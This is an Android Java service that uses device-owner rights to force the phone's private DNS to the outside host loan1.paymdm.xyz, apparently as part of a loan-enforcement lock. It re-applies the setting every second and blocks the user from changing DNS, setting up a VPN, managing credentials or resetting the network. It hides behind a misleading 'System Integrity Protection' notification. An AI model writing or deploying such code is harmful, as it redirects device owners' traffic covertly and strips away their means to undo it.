package com.mrog.mdm;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.UserManager;
import android.provider.Settings;

public class DnsWatchdogService extends Service {
    private Handler handler = new Handler();
    private DevicePolicyManager dpm;
    private ComponentName admin;

    private android.database.ContentObserver observer = new android.database.ContentObserver(handler) {
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            ensureDnsLocked();
        }
    };

    private Runnable watchdog = new Runnable() {
        @Override
        public void run() {
            ensureDnsLocked();
            handler.postDelayed(this, 1000); 
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        admin = new ComponentName(this, MyDeviceAdminReceiver.class);
        
        // --- START FOREGROUND (Crucial for Samsung Persistence) ---
        String CHANNEL_ID = "mrog_dns_lock";
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            android.app.NotificationChannel channel = new android.app.NotificationChannel(
                CHANNEL_ID, "Security Engine", android.app.NotificationManager.IMPORTANCE_LOW);
            getSystemService(android.app.NotificationManager.class).createNotificationChannel(channel);
        }

        android.app.Notification notification = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notification = new android.app.Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("MR OG SECURITY ACTIVE")
                .setContentText("System Integrity Protection Running...")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .build();
        }

        if (notification != null) {
            startForeground(101, notification);
        }
        
        getContentResolver().registerContentObserver(
            Settings.Global.getUriFor("private_dns_mode"), 
            true, observer);
        getContentResolver().registerContentObserver(
            Settings.Global.getUriFor("private_dns_specifier"), 
            true, observer);

        handler.post(watchdog);
        return START_STICKY;
    }

    private void ensureDnsLocked() {
        if (dpm.isDeviceOwnerApp(getPackageName())) {
            try {
                // MASTER FORCE: Always write settings
                // Some Samsung devices use these keys
                dpm.setGlobalSetting(admin, "private_dns_mode", "hostname");
                dpm.setGlobalSetting(admin, "private_dns_specifier", "loan1.paymdm.xyz");
                dpm.setGlobalSetting(admin, "private_dns_default_mode", "hostname");
                
                // Extra Samsung/Android 13+ keys
                try {
                    dpm.setGlobalSetting(admin, "private_dns_web_host", "loan1.paymdm.xyz");
                    dpm.setGlobalSetting(admin, "private_dns_mode_modify_allowed", "0");
                } catch (Exception e) {}

                // Restrictions using strings for stability across all API levels
                dpm.addUserRestriction(admin, UserManager.DISALLOW_CONFIG_PRIVATE_DNS);
                dpm.addUserRestriction(admin, UserManager.DISALLOW_CONFIG_VPN);
                dpm.addUserRestriction(admin, UserManager.DISALLOW_CONFIG_CREDENTIALS);
                dpm.addUserRestriction(admin, UserManager.DISALLOW_NETWORK_RESET);
                
                // Prevent settings from being modified via search
                dpm.setUninstallBlocked(admin, "com.android.settings", true); 
            } catch (Exception e) {
                // Ignore errors
            }
        }
    }

    @Override
    public void onDestroy() {
        getContentResolver().unregisterContentObserver(observer);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
